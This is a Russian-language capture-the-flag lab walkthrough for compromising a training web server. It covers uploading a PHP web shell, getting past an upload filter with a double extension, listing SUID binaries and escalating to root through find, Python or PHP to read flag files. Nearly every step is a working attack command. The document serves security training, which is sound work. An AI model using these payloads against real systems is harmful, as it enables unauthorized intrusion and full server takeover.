🔒 Лабораторная работа

Взлом веб-сервера и получение флагов (Capture The Flag)

📁 Задание 1: Corporate File Server - User

Цель: Найти уязвимость на сайте, загрузить файл (RCE), получить доступ от имени www-data или user и найти флаг в /home/user/user.txt

Шаг 1: Открыть сайт

http://192.168.0.181:8080

Введите этот адрес в адресной строке браузера и нажмите Enter.

Шаг 2: Найти форму загрузки файлов

На сайте найдите кнопки:

  • "Upload"
  • "Choose File"
  • "Browse"
  • "Загрузить"

Шаг 3: Создать файл web-shell

  1. На рабочем столе нажмите правой кнопкой мыши → "Создать" → "Текстовый документ"
  2. Переименуйте файл в shell.php
  3. Откройте файл в Блокноте (Notepad)
  4. Вставьте код: 
    <?php system($_GET['cmd']); ?>
  5. Сохраните файл (Ctrl+S)

Шаг 4: Загрузить файл на сайт

  1. Нажмите "Choose File" или "Browse"
  2. Выберите файл shell.php
  3. Нажмите "Upload" или "Загрузить"

Шаг 5: Найти расположение загруженного файла

Поочередно проверьте следующие адреса в браузере:

http://192.168.0.181:8080/uploads/shell.php?cmd=id
http://192.168.0.181:8080/files/shell.php?cmd=id
http://192.168.0.181:8080/upload/shell.php?cmd=id
http://192.168.0.181:8080/shell.php?cmd=id

✅ Признак успеха: Если вы видите:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Значит, вы нашли правильный путь!

Шаг 6: Получить первый флаг

Замените cmd=id на команду чтения флага:

http://192.168.0.181:8080/[НАЙДЕННЫЙ_ПУТЬ]/shell.php?cmd=cat%20/home/user/user.txt

Пример: если файл в папке uploads:

http://192.168.0.181:8080/uploads/shell.php?cmd=cat%20/home/user/user.txt

На экране отобразится первый флаг. Запишите его!

👑 Задание 2: Root Access (Повышение привилегий)

Цель: Исследовать SUID-файлы, получить права root и найти флаг в /root/root.txt

Шаг 1: Найти файлы с SUID-битом

Введите в браузере (замените [ПУТЬ] на найденный ранее):

http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null

Пример:

http://192.168.0.181:8080/uploads/shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null

Шаг 2: Найти подходящий файл в списке

В полученном списке ищите один из этих файлов:

  • /usr/bin/find
  • /usr/bin/python
  • /usr/bin/php
  • /usr/bin/vim
  • /usr/bin/less

Шаг 3: Получить root shell

🔹 Если найден /usr/bin/find:

http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=find%20.%20-exec%20/bin/sh%20-p%20%5C%3B%20-quit

🔹 Если найден /usr/bin/python:

http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=python%20-c%20%27import%20os%3B%20os.setuid(0)%3B%20os.system(%22/bin/sh%22)%27

🔹 Если найден /usr/bin/php:

http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=php%20-r%20%27posix_setuid(0)%3B%20system(%22/bin/sh%22)%3B%27

Шаг 4: Получить второй флаг

После получения root-доступа, прочитайте второй флаг:

http://192.168.0.181:8080/[ПУТЬ]/shell.php?cmd=cat%20/root/root.txt

На экране отобразится второй флаг!

⚠️ Решение возможных проблем

❌ Если файл .php не загружается (ошибка "Forbidden"):
1. Переименуйте файл в shell.php.jpg или shell.php.png
2. Загрузите снова
3. При обращении используйте: shell.php.jpg?cmd=id
❌ Если команда не выполняется:
Проверьте, правильно ли указан путь к файлу. Попробуйте cmd=whoami или cmd=ls
❌ Если нет подходящих SUID-файлов:
Попробуйте выполнить sudo -l через веб-шелл, чтобы увидеть доступные команды
